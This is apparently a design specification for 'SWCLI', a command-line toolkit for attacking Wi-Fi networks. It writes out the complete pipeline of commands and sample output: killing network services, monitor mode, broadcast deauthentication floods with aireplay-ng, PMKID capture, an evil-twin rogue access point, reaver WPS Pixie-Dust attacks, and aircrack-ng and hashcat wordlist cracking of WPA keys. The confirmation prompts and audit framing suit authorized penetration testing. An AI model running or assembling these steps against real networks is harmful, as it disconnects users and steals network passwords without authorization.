# SWCLI — Complete Attack & Audit Pipelines

> **PHILOSOPHY:** User commands, CLI executes. Every step requires human decision.
> The CLI is a toolkit (like airmon-ng + airodump-ng + aireplay-ng), NOT an autonomous auditor.
> User picks the adapter, user confirms every destructive action, user chains commands manually.

---

## Master Flow — Human-Driven

```
USER runs              CLI does                    USER decides next
─────────────────────  ──────────────────────────  ──────────────────
swcli adapters         Lists all wireless cards     User picks which card
swcli deps             Shows missing tools          User installs or continues
swcli rfkill           Shows blocked adapters       User unblocks or skips
swcli kill             Shows conflicting services   User confirms YES/NO
swcli monitor <card>   Enters monitor mode          User provides channel
swcli scan             Runs airodump-ng             User watches, Ctrl+C when done
swcli capture ...      Captures handshake           User validates
swcli validate <cap>   Validates handshake          User sees M1-M4 status
swcli crack ...        Cracks password              User sees result
swcli cleanup          Restores everything          Done
```

**The user is the orchestrator. The CLI is the executor.**

---

## PHASE 0: PREFLIGHT — Informational Only

### 0.1 Root Check

```
swcli root

CHECK: os.geteuid() == 0
OUTPUT:
  [OK] Running as root
  OR
  [!] Not running as root — many commands will fail
      Run: sudo swcli ...

NOTE: Does NOT exit. User decides whether to continue.
```

### 0.2 Dependency Check

```
swcli deps

SCAN: shutil.which() for every binary
OUTPUT:
  REQUIRED:
    [OK] airodump-ng    /usr/bin/airodump-ng
    [OK] aireplay-ng    /usr/bin/aireplay-ng
    [OK] aircrack-ng    /usr/bin/aircrack-ng
    [OK] iw             /usr/sbin/iw
    [OK] ip             /sbin/ip
  
  OPTIONAL (for specific attacks):
    [OK] hashcat        /usr/bin/hashcat
    [--] hcxpcapngtool  NOT FOUND — needed for PMKID + hashcat
    [OK] airbase-ng     /usr/bin/airbase-ng
    [--] reaver         NOT FOUND — needed for WPS attack
    [OK] dnsmasq        /usr/bin/dnsmasq
  
  SUMMARY: 5/5 required, 3/6 optional

NOTE: Purely informational. User decides what to install.
```

### 0.3 rfkill Status

```
swcli rfkill

COMMAND: rfkill list wifi
OUTPUT:
  phy0: Wireless LAN
    Soft blocked: no
    Hard blocked: no
  
  phy1: Wireless LAN (USB)
    Soft blocked: yes     ← blocked
    Hard blocked: no

  To unblock: swcli rfkill unblock
  To unblock all: swcli rfkill unblock --all

NOTE: Does NOT auto-unblock. User must run unblock command.
```

### 0.4 rfkill Unblock (user-initiated)

```
swcli rfkill unblock       # unblock all
swcli rfkill unblock phy1  # unblock specific

CONFIRM:
  Unblock wifi on phy1? [y/N]: y

COMMAND: rfkill unblock wifi
OUTPUT:
  [+] Unblocked phy1
```

---

## PHASE 1: RECON — User-Driven Discovery

### 1.1 List Adapters

```
swcli adapters

SCAN: /sys/class/net/*/phy80211
FOR EACH wireless interface:
    Read: phy, driver, bus, mac, vid, pid, mode, is_up
    Lookup in KNOWN_DEVICES registry
    Classify: OPTIMIZED / WORKING / LIMITED / INTERNET_ONLY

OUTPUT:
  #   Interface          Chipset     Driver      Bus   Mode     Bands    Monitor  Inject  Status
  1   wlx5c628b765de2    RTL8821AU   rtw88       usb   managed  2.4/5G   YES      YES     OPTIMIZED
  2   wlx001ea6c65744    RT5370      rt2800usb   usb   monitor  2.4G     YES      YES     WORKING
  3   wlo1               MT7902      mt7921e     pci   managed  2.4/5G   NO       NO      INTERNET_ONLY

  Total: 3 adapters found
  Use: swcli monitor <interface> to enter monitor mode

NOTE: No auto-selection. User picks which card to use by name.
```

### 1.2 Adapter Details

```
swcli adapters info wlx5c628b765de2

OUTPUT:
  Interface:      wlx5c628b765de2
  PHY:            phy0
  Chipset:        RTL8821AU
  Driver:         rtw88_8821au
  Bus:            USB
  MAC:            5C:62:8B:76:5D:E2
  VID:PID:        2357:0120
  Bands:          2.4GHz, 5GHz
  Current Mode:   managed
  Monitor:        YES
  Injection:      YES
  Status:         OPTIMIZED
  
  Supported operations:
    scan:       YES
    capture:    YES
    deauth:     YES
    inject:     YES
    evil-twin:  YES
```

### 1.3 Kill Conflicting Services

```
swcli kill

STEP 1: Find conflicts
  COMMAND: ps -A -o pid=,args=
  MATCH: NetworkManager, wpa_supplicant, wpa_cli, dhclient, etc.

STEP 2: Show what will be killed
  OUTPUT:
    Conflicting services found:
      PID    Service           Status
      1234   NetworkManager    running (systemd)
      5678   wpa_supplicant    running (systemd)
    
    These will be stopped to prevent interference with monitor mode.
    
    WARNING: This will disconnect you from WiFi.
    
    Kill these services? [y/N]:

STEP 3: User confirms
  IF y/n not provided → abort, do nothing
  IF y:
    FOR EACH service:
      systemctl stop {name} (timeout 10s)
      os.killpg(pgid, SIGKILL) if still running
      TRACK for later restore
    
    OUTPUT:
      [+] Stopped: NetworkManager (pid=1234)
      [+] Stopped: wpa_supplicant (pid=5678)
      
      Services tracked for restore.
      Run: swcli restore to bring them back.
  
  IF N (default):
    OUTPUT:
      [=] Aborted — no services killed
      [!] Monitor mode may fail if services are running
```

### 1.4 Restore Services

```
swcli restore

CHECK: ServiceManager.killed_processes
IF EMPTY:
    OUTPUT: [=] No services to restore
IF NOT EMPTY:
    OUTPUT:
      Services to restore:
        1. wpa_supplicant
        2. NetworkManager
      
      Restore these services? [y/N]:
    
    IF y:
      REVERSE order:
        systemctl start {name}
        POLL is-active every 0.5s (15s max)
      
      OUTPUT:
        [+] Restored: wpa_supplicant (active)
        [+] Restored: NetworkManager (active)
    
    IF N:
      OUTPUT: [=] Aborted — services remain stopped
```

---

## PHASE 2: MONITOR MODE — User Commands

### 2.1 Enter Monitor Mode

```
swcli monitor <interface> [--channel N]

ARGUMENTS:
  <interface>   REQUIRED — user must specify which card (from swcli adapters)
  --channel N   OPTIONAL — defaults to 1 if not provided

EXAMPLE:
  swcli monitor wlx5c628b765de2 --channel 6

STEPS:
  1. VERIFY interface exists: /sys/class/net/{iface}
  2. READ phy: /sys/class/net/{iface}/phy80211/name
  3. CHECK if monitor capable (via iw list or KNOWN_DEVICES)
  4. CONFIRM with user:
    
    Adapter:  wlx5c628b765de2 (RTL8821AU)
    PHY:      phy0
    Channel:  6
    
    This will:
      - Bring the interface down
      - Create monitor interface: wlx5c628b765de2mon
      - Set channel to 6
      - Set TX power to 30 dBm
    
    Continue? [y/N]:
  
  5. IF y:
    a. ip link set wlx5c628b765de2 down
    b. iw phy phy0 interface add wlx5c628b765de2mon type monitor
    c. ip link set wlx5c628b765de2mon up
    d. iw dev wlx5c628b765de2mon set channel 6
    e. iw dev wlx5c628b765de2mon set txpower fixed 3000
    f. VERIFY: /sys/class/net/wlx5c628b765de2mon/type → "803"
    
    OUTPUT:
      [+] Monitor mode active: wlx5c628b765de2mon
      [+] Channel: 6
      [+] TX Power: 30 dBm
      
      Ready for scanning/capture.
      Run: swcli scan
  
  6. IF N:
    OUTPUT: [=] Aborted
```

### 2.2 Exit Monitor Mode

```
swcli monitor stop <mon_interface> [--interface <original>] [--phy <phy>]

ARGUMENTS:
  <mon_interface>     REQUIRED — the monitor interface (e.g., wlx5c628b765de2mon)
  --interface <name>  OPTIONAL — original managed interface (auto-detected if possible)
  --phy <phy>         OPTIONAL — PHY name (auto-detected if possible)

EXAMPLE:
  swcli monitor stop wlx5c628b765de2mon

CONFIRM:
  Stop monitor mode on wlx5c628b765de2mon?
  This will restore wlx5c628b765de2 to managed mode. [y/N]:

STEPS (standard path):
  1. iw dev wlx5c628b765de2mon del
  2. iw phy phy0 interface add wlx5c628b765de2 type station
  3. ip link set wlx5c628b765de2 up
  4. VERIFY: /sys/class/net/wlx5c628b765de2/type → "1"

OUTPUT:
  [+] Monitor mode stopped
  [+] Managed mode restored: wlx5c628b765de2
```

### 2.3 Monitor Status

```
swcli monitor status <interface>

COMMAND: Read /sys/class/net/{iface}/type
OUTPUT:
  Interface: wlx5c628b765de2mon
  Type:      803
  Mode:      monitor
  
  OR
  
  Interface: wlx5c628b765de2
  Type:      1
  Mode:      managed
```

---

## PHASE 3: SCAN — User-Driven

### 3.1 Start Scan

```
swcli scan <mon_interface> [--band a|bg] [--channels 1,6,11]

ARGUMENTS:
  <mon_interface>   REQUIRED — must be in monitor mode first
  --band            OPTIONAL — "a" for 5GHz, "bg" for 2.4GHz
  --channels        OPTIONAL — comma-separated channel list

EXAMPLE:
  swcli scan wlx5c628b765de2mon --band bg

CONFIRM:
  Scan WiFi on wlx5c628b765de2mon?
  Band: 2.4GHz only
  Channels: all
  
  Start scan? [y/N]:

COMMAND:
  airodump-ng wlx5c628b765de2mon
    --write /tmp/sidewinder_scan
    --output-format csv
    -a
    --wps
    [--band bg]
    [--channel 1,6,11]

POLLING (every 1s):
  READ: /tmp/sidewinder_scan-01.csv
  PARSE: AirodumpParser state machine
  DISPLAY: Live table

OUTPUT (live updating):
  BSSID              CH  Signal  Privacy  Cipher  Auth  ESSID              WPS   Clients
  ──────────────────  ──  ──────  ───────  ──────  ────  ─────────────────  ────  ───────
  AA:BB:CC:DD:EE:01   6  -45     WPA2     CCMP    PSK   HomeNetwork        No    2
  AA:BB:CC:DD:EE:02  11  -62     WPA2     CCMP    PSK   Office_5G          Yes   1
  AA:BB:CC:DD:EE:03   1  -78     WEP      WEP     OPEN  CoffeeShop         No    0
  
  Networks: 3   Clients: 3   Elapsed: 00:45
  Press Ctrl+C to stop scanning

STOP: Ctrl+C → kill airodump-ng → show final results
```

### 3.2 Show Scan Results (after stop)

```
swcli results

READ: Last scan data from session
OUTPUT:
  Scan results (saved to session):
  
  #   BSSID              CH  Signal  Privacy  ESSID              WPS
  1   AA:BB:CC:DD:EE:01   6  -45     WPA2     HomeNetwork        No
  2   AA:BB:CC:DD:EE:02  11  -62     WPA2     Office_5G          Yes
  3   AA:BB:CC:DD:EE:03   1  -78     WEP      CoffeeShop         No
  
  Clients seen:
  MAC                BSSID              Signal  Packets
  AA:BB:CC:DD:EE:10  AA:BB:CC:DD:EE:01  -50     234
  AA:BB:CC:DD:EE:11  AA:BB:CC:DD:EE:01  -55     189
  AA:BB:CC:DD:EE:12  AA:BB:CC:DD:EE:02  -65     45
  
  Use: swcli capture <BSSID> <channel> to capture handshake
```

---

## PHASE 4: CAPTURE — User-Driven

### 4.1 Passive Capture

```
swcli capture passive <mon_interface> <bssid> <channel> [--output <prefix>] [--timeout N]

ARGUMENTS:
  <mon_interface>   REQUIRED
  <bssid>           REQUIRED — target AP MAC
  <channel>         REQUIRED — user must know this from scan
  --output          OPTIONAL — defaults to /tmp/sidewinder_cap
  --timeout         OPTIONAL — seconds, defaults to 300

EXAMPLE:
  swcli capture passive wlx5c628b765de2mon AA:BB:CC:DD:EE:01 6

CONFIRM:
  Passive capture on:
    Interface:  wlx5c628b765de2mon
    Target:     AA:BB:CC:DD:EE:01
    Channel:    6
    Timeout:    300s
  
  This will listen for a WPA handshake without sending any packets.
  The process may run for several minutes.
  
    Start capture? [y/N]:

STEPS:
  1. iw dev wlx5c628b765de2mon set channel 6
  2. START airodump-ng (background):
     airodump-ng wlx5c628b765de2mon
       --bssid AA:BB:CC:DD:EE:01
       --channel 6
       --write /tmp/sidewinder_cap
       --output-format pcap
       --write-interval 1
  3. START EAPOL poll (separate async task):
     PcapReader(/tmp/sidewinder_cap-01.cap)
     CHECK: is_m1(ki), is_m2(ki), is_m3(ki), is_m4(ki)
     EVERY 2 seconds

OUTPUT (live updating):
  Passive capture on AA:BB:CC:DD:EE:01 (ch6)...
  [00:00:15] M1 ✓  M2 ✗  M3 ✗  M4 ✗  — partial
  [00:00:32] M1 ✓  M2 ✓  M3 ✗  M4 ✗  — partial
  [00:01:05] M1 ✓  M2 ✓  M3 ✓  M4 ✗  — partial
  [00:01:23] M1 ✓  M2 ✓  M3 ✓  M4 ✓  — FULL HANDSHAKE CAPTURED!
  
  File: /tmp/sidewinder_cap-01.cap
  EAPOL frames: 8
  SHA-256: da39a3ee5e6b4b0d3255bfef95601890afd80709
  
  Run: swcli validate /tmp/sidewinder_cap-01.cap

STOP: Ctrl+C → kill airodump-ng → return whatever was captured
```

### 4.2 Deauth + Capture

```
swcli capture deauth <mon_interface> <bssid> <channel> [--client MAC] [--count N] [--bursts N]

ARGUMENTS:
  <mon_interface>   REQUIRED
  <bssid>           REQUIRED
  <channel>         REQUIRED
  --client          OPTIONAL — specific client MAC or "FF:FF:FF:FF:FF:FF" (broadcast)
  --count           OPTIONAL — deauth frames per burst (default: 10)
  --bursts          OPTIONAL — number of bursts (default: 3)

EXAMPLE:
  swcli capture deauth wlx5c628b765de2mon AA:BB:CC:DD:EE:01 6 --client FF:FF:FF:FF:FF:FF --count 10 --bursts 3

CONFIRM:
  Deauth + Capture:
    Interface:  wlx5c628b765de2mon
    Target:     AA:BB:CC:DD:EE:01
    Channel:    6
    Client:     FF:FF:FF:FF:FF:FF (broadcast — all clients)
    Deauths:    10 frames × 3 bursts = 30 total
    Timeout:    300s
  
  WARNING: This will send deauthentication frames.
  All clients on this AP will be temporarily disconnected.
  
    Start deauth attack? [y/N]:

STEPS:
  1. CHECK adapter injection (refuse if MT7902)
  2. SET channel: iw dev {mon_iface} set channel 6
  3. START passive capture (background task)
  4. WAIT 1s
  5. FOR burst in 1..3:
     a. aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:01 -c FF:FF:FF:FF:FF:FF wlx5c628b765de2mon
     b. WAIT for deauth (15s timeout)
     c. COOLDOWN: 10s between bursts
  6. WAIT for EAPOL capture
  7. KILL airodump-ng

OUTPUT:
  Burst 1/3: sent 10 deauths ... cooldown 10s
  Burst 2/3: sent 10 deauths ... cooldown 10s
  Burst 3/3: sent 10 deauths
  
  [00:00:08] M1 ✓  M2 ✓  M3 ✗  M4 ✗  — partial
  [00:00:15] M1 ✓  M2 ✓  M3 ✓  M4 ✓  — FULL HANDSHAKE!
  
  Total deauths sent: 30
  Handshake captured in 15s
  File: /tmp/sidewinder_cap-01.cap
  
  Run: swcli validate /tmp/sidewinder_cap-01.cap
```

### 4.3 PMKID Capture

```
swcli capture pmkid <mon_interface> <bssid> <channel> [--timeout N]

ARGUMENTS:
  <mon_interface>   REQUIRED
  <bssid>           REQUIRED
  <channel>         REQUIRED
  --timeout         OPTIONAL — defaults to 300

EXAMPLE:
  swcli capture pmkid wlx5c628b765de2mon AA:BB:CC:DD:EE:01 6

CONFIRM:
  PMKID capture:
    Interface:  wlx5c628b765de2mon
    Target:     AA:BB:CC:DD:EE:01
    Channel:    6
    Timeout:    300s
  
  This will attempt to capture the PMKID hash directly from the AP.
  No clients required, but AP must have 802.11r roaming enabled.
  
  Requires: hcxdumptool, hcxpcapngtool
  
    Start PMKID capture? [y/N]:

STEPS:
  1. CHECK: hcxdumptool and hcxpcapngtool exist
  2. CREATE filter file:
     WRITE "AABBCCDDEE01" to /tmp/sidewinder_filter_AABBCCDDEE01.txt
  3. RUN hcxdumptool:
     hcxdumptool -i wlx5c628b765de2mon
       -o /tmp/pmkid_AABBCCDDEE01.pcapng
       --filterlist_ap /tmp/sidewinder_filter_AABBCCDDEE01.txt
       --filtermode 2
       --enable_status 1
  4. WAIT for timeout
  5. STOP hcxdumptool
  6. CONVERT:
     hcxpcapngtool -o /tmp/pmkid_AABBCCDDEE01.hc22000 /tmp/pmkid_AABBCCDDEE01.pcapng
  7. CLEANUP filter file

OUTPUT:
  Capturing PMKID... (0/300s)
  Capturing PMKID... (30/300s)
  ...
  [+] PMKID captured!
  Converting to hashcat format...
  Hash file: /tmp/pmkid_AABBCCDDEE01.hc22000
  
  Run: swcli crack hashcat /tmp/pmkid_AABBCCDDEE01.hc22000 --wordlist /usr/share/wordlists/rockyou.txt
```

### 4.4 Validate Capture

```
swcli validate <cap_file>

ARGUMENTS:
  <cap_file>   REQUIRED — path to .cap or .pcapng file

EXAMPLE:
  swcli validate /tmp/sidewinder_cap-01.cap

NO CONFIRMATION — read-only operation

STEPS:
  1. READ: rdpcap(cap_file) via scapy
  2. FILTER: EAPOL packets
  3. CLASSIFY: is_m1(ki), is_m2(ki), is_m3(ki), is_m4(ki)
  4. COMPUTE: SHA-256 of file

OUTPUT:
  Validating: /tmp/sidewinder_cap-01.cap
  
  EAPOL frames: 8
  
  Message Status:
    M1: ✓  (Pairwise, ACK)
    M2: ✓  (Pairwise, MIC)
    M3: ✓  (Pairwise, Install, ACK, MIC, Secure)
    M4: ✓  (Pairwise, MIC, Secure)
  
  Status:     FULL (complete 4-way handshake)
  SHA-256:    da39a3ee5e6b4b0d3255bfef95601890afd80709
  
  [OK] This capture is usable for cracking.
  
  Run: swcli crack aircrack /tmp/sidewinder_cap-01.cap --bssid AA:BB:CC:DD:EE:01 --wordlist /usr/share/wordlists/rockyou.txt
```

---

## PHASE 5: ATTACK MODULES — User-Driven

### 5.1 Evil Twin

```
swcli attack evil-twin <mon_interface> <essid> <channel> [--bssid <clone_bssid>]

ARGUMENTS:
  <mon_interface>   REQUIRED
  <essid>           REQUIRED — network name to broadcast
  <channel>         REQUIRED
  --bssid           OPTIONAL — clone specific AP MAC

EXAMPLE:
  swcli attack evil-twin wlx5c628b765de2mon "FreeWiFi" 6 --bssid AA:BB:CC:DD:EE:01

CONFIRM:
  Evil Twin attack:
    Interface:  wlx5c628b765de2mon
    ESSID:      "FreeWiFi"
    Channel:    6
    Clone BSSID: AA:BB:CC:DD:EE:01 (optional)
  
  WARNING: This creates a rogue Access Point.
  Clients may connect to your AP instead of the real one.
  
    Start Evil Twin? [y/N]:

STEPS:
  1. airbase-ng -e "FreeWiFi" -c 6 [-a AA:BB:CC:DD:EE:01] wlx5c628b765de2mon
  2. STREAM stdout for client associations
  3. WAIT for timeout or Ctrl+C

OUTPUT:
  Rogue AP active: "FreeWiFi" on ch6
  Waiting for clients...
  [+] Client AA:BB:CC:DD:EE:FF associated
  [+] Handshake captured from client
```

### 5.2 WPS Attack

```
swcli attack wps <mon_interface> <bssid> <channel>

ARGUMENTS:
  <mon_interface>   REQUIRED
  <bssid>           REQUIRED
  <channel>         REQUIRED

EXAMPLE:
  swcli attack wps wlx5c628b765de2mon AA:BB:CC:DD:EE:01 6

CONFIRM:
  WPS Pixie-Dust attack:
    Interface:  wlx5c628b765de2mon
    Target:     AA:BB:CC:DD:EE:01
    Channel:    6
  
  Requires: reaver
  Target must have WPS enabled.
  
    Start WPS attack? [y/N]:

STEPS:
  1. CHECK: reaver exists
  2. RUN: reaver -i wlx5c628b765de2mon -b AA:BB:CC:DD:EE:01 -c 6 -K 1 -q
  3. STREAM stdout for results
  4. PARSE: "WPS PIN:" and "WPA PSK:"

OUTPUT:
  Running Reaver Pixie-Dust...
  [+] WPS PIN: 12345678
  [+] WPA PSK: MySecretPassword
  
  PIN:  12345678
  PSK:  MySecretPassword
```

---

## PHASE 6: CRACK — User-Driven

### 6.1 List Wordlists

```
swcli wordlists

SCAN:
  /usr/share/wordlists/rockyou.txt
  /usr/share/wordlists/rockyou.txt.gz
  /opt/wordlists/rockyou.txt
  /root/wordlists/rockyou.txt
  /home/kali/wordlists/rockyou.txt
  /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

OUTPUT:
  Available wordlists:
  
  #   Path                                                          Size
  1   /usr/share/wordlists/rockyou.txt                              139,920,962
  2   /usr/share/seclists/.../10-million-password-list-top-1000000   10,234,567
  
  Use: swcli crack aircrack <cap> --wordlist <path>
```

### 6.2 Aircrack-ng Crack (CPU)

```
swcli crack aircrack <cap_file> --bssid <bssid> --wordlist <wordlist_path>

ARGUMENTS:
  <cap_file>       REQUIRED
  --bssid          REQUIRED — target AP BSSID
  --wordlist       REQUIRED — path to wordlist

EXAMPLE:
  swcli crack aircrack /tmp/sidewinder_cap-01.cap --bssid AA:BB:CC:DD:EE:01 --wordlist /usr/share/wordlists/rockyou.txt

CONFIRM:
  Crack with aircrack-ng:
    Capture:   /tmp/sidewinder_cap-01.cap
    Target:    AA:BB:CC:DD:EE:01
    Wordlist:  /usr/share/wordlists/rockyou.txt
    
    Start cracking? [y/N]:

STEPS:
  1. CHECK: aircrack-ng exists
  2. RUN: aircrack-ng -w {wordlist} -b {bssid} {cap_file}
  3. STREAM stdout:
     PARSE progress: "1234 keys tested (5678.90 k/s)"
     DETECT success: "KEY FOUND! [ password ]"

OUTPUT:
  Cracking with aircrack-ng...
  [00:00:05] 1,234 keys tested (5678.90 k/s)
  [00:00:10] 5,678 keys tested (5890.12 k/s)
  ...
  [+] KEY FOUND! [ MySecretPassword ]
  
  Password:  MySecretPassword
  Keys tested: 12,345
  Time: 00:02:15
```

### 6.3 Hashcat Crack (GPU)

```
swcli crack hashcat <cap_file> --wordlist <wordlist_path>

ARGUMENTS:
  <cap_file>       REQUIRED
  --wordlist       REQUIRED

EXAMPLE:
  swcli crack hashcat /tmp/sidewinder_cap-01.cap --wordlist /usr/share/wordlists/rockyou.txt

CONFIRM:
  Crack with hashcat (GPU):
    Capture:   /tmp/sidewinder_cap-01.cap
    Wordlist:  /usr/share/wordlists/rockyou.txt
  
  Requires: hashcat, hcxpcapngtool
  
    Convert and start cracking? [y/N]:

STEPS:
  1. CHECK: hashcat and hcxpcapngtool exist
  2. CONVERT: hcxpcapngtool -o {hash_file}.22000 {cap_file}
  3. RUN: hashcat -m 22000 {hash_file}.22000 -a 0 {wordlist} --status --status-timer 2
  4. STREAM stdout:
     PARSE progress: "Progress.....: 1234567/14344391 (8.60%)"
     DETECT success: "Status.........: Cracked"
  5. READ potfile: ~/.hashcat/hashcat.potfile

OUTPUT:
  Converting to hashcat format...
  Running hashcat (GPU)...
  [00:00:10] 1,234,567/14,344,391 (8.60%) — 123,456 H/s — ETA: 2h 30m
  ...
  [+] PASSWORD FOUND!
  
  Password: MySecretPassword
  Keys tested: 14,344,391
  Time: 02:30:15
```

---

## PHASE 7: CLEANUP — User-Driven

### 7.1 Full Cleanup

```
swcli cleanup

CONFIRM:
  Full cleanup will:
    1. Kill: airodump-ng, aireplay-ng, hashcat, aircrack-ng
    2. Exit monitor mode
    3. Restore: NetworkManager, wpa_supplicant
    4. Delete: /tmp/sidewinder_*
  
    Run full cleanup? [y/N]:

STEPS:
  1. pkill -9 -f airodump-ng / aireplay-ng / hashcat / aircrack-ng
  2. iw dev {mon_iface} del
  3. iw phy {phy} interface add {iface} type station
  4. ip link set {iface} up
  5. REVERSE restore killed services (systemctl start)
  6. POLL is-active for each service (15s max)
  7. VERIFY: ip addr show {iface} has "inet "
  8. DELETE: /tmp/sidewinder_*

OUTPUT:
  [+] Killed attack processes
  [+] Monitor mode stopped
  [+] Restored: wpa_supplicant (active)
  [+] Restored: NetworkManager (active)
  [+] Connectivity verified: wlx5c628b765de2 has IP
  [+] Temp files cleaned
  
  Cleanup complete.
```

### 7.2 Kill Attack Processes Only

```
swcli cleanup procs

NO CONFIRMATION — non-destructive (just kills background procs)

COMMANDS:
  pkill -9 -f airodump-ng
  pkill -9 -f aireplay-ng
  pkill -9 -f hashcat
  pkill -9 -f aircrack-ng

OUTPUT:
  [+] Killed: airodump-ng
  [+] Killed: aireplay-ng
  [=] Not running: hashcat
  [=] Not running: aircrack-ng
```

### 7.3 Clean Temp Files Only

```
swcli cleanup files [--dry-run]

ARGUMENTS:
  --dry-run   OPTIONAL — show what would be deleted without deleting

NO CONFIRMATION for dry-run
CONFIRMATION for actual delete:
  Delete /tmp/sidewinder_scan-01.csv, /tmp/sidewinder_cap-01.cap? [y/N]:

OUTPUT:
  Files to delete:
    /tmp/sidewinder_scan-01.csv
    /tmp/sidewinder_scan-01.cap
    /tmp/sidewinder_cap-01.cap
  
  [+] 3 files deleted
```

---

## CLI COMMAND STRUCTURE

```
swcli
│
├── PREFLIGHT (informational)
│   ├── root              # Check if running as root
│   ├── deps              # Check required/optional binaries
│   └── rfkill
│       ├──               # Show rfkill status
│       └── unblock       # Unblock wifi (with confirm)
│
├── HARDWARE
│   ├── adapters          # List all wireless interfaces
│   ├── adapters info <i> # Details for one interface
│   ├── kill              # Kill conflicting services (with confirm)
│   └── restore           # Restore killed services (with confirm)
│
├── MONITOR
│   ├── monitor <i>       # Enter monitor mode (with confirm)
│   ├── monitor stop <m>  # Exit monitor mode (with confirm)
│   └── monitor status <i># Check current mode
│
├── SCAN
│   ├── scan <mon>        # Start airodump-ng scan (with confirm)
│   └── results           # Show last scan results
│
├── CAPTURE
│   ├── capture passive <mon> <bssid> <ch>   # Passive capture (with confirm)
│   ├── capture deauth <mon> <bssid> <ch>    # Deauth capture (with confirm)
│   ├── capture pmkid <mon> <bssid> <ch>     # PMKID capture (with confirm)
│   └── validate <cap>                        # Validate handshake (no confirm)
│
├── ATTACK
│   ├── attack evil-twin <mon> <essid> <ch>  # Evil Twin (with confirm)
│   └── attack wps <mon> <bssid> <ch>        # WPS Pixie-Dust (with confirm)
│
├── CRACK
│   ├── wordlists            # List available wordlists
│   ├── crack aircrack <cap> # Crack with aircrack-ng (with confirm)
│   └── crack hashcat <cap>  # Crack with hashcat (with confirm)
│
├── CLEANUP
│   ├── cleanup              # Full cleanup (with confirm)
│   ├── cleanup procs        # Kill attack procs only
│   └── cleanup files        # Clean temp files (with confirm)
│
├── SESSION
│   ├── session save         # Save current state
│   ├── session load [id]    # Load saved session
│   └── session list         # List saved sessions
│
└── CONFIG
    ├── config show          # Show current config
    └── config set <k> <v>   # Update config value
```

---

## TYPICAL USER WORKFLOW (Manual)

```bash
# 1. Check what's available
sudo swcli deps
sudo swcli adapters

# 2. Prepare for audit
sudo swcli rfkill
sudo swcli kill                    # confirms before killing

# 3. Enter monitor mode
sudo swcli monitor wlx5c628b765de2 --channel 6    # confirms

# 4. Scan
sudo swcli scan wlx5c628b765de2mon                 # confirms
# ... Ctrl+C when done ...

# 5. Capture handshake
sudo swcli capture deauth wlx5c628b765de2mon AA:BB:CC:DD:EE:01 6   # confirms

# 6. Validate
sudo swcli validate /tmp/sidewinder_cap-01.cap

# 7. Crack
sudo swcli wordlists
sudo swcli crack aircrack /tmp/sidewinder_cap-01.cap --bssid AA:BB:CC:DD:EE:01 --wordlist /usr/share/wordlists/rockyou.txt

# 8. Cleanup
sudo swcli cleanup                 # confirms
```

**Every step = user command. No auto-chaining. Human decides the flow.**

---

## MOCK MODE

For development without root/hardware:

```
swcli scan MOCK           # returns fake networks
swcli capture passive MOCK AA:BB:CC:DD:EE:01 6  # returns fake handshake
swcli crack aircrack MOCK --bssid AA:BB:CC:DD:EE:01 --wordlist fake.txt  # returns fake password
```

---

## SIGNAL HANDLING

```
SIGINT (Ctrl+C):
    IF scanning: stop airodump-ng, show results
    IF capturing: stop airodump-ng, return partial handshake
    IF cracking: stop aircrack/hashcat
    
    Does NOT auto-cleanup. User must run: swcli cleanup

SIGTERM:
    Same as SIGINT
```
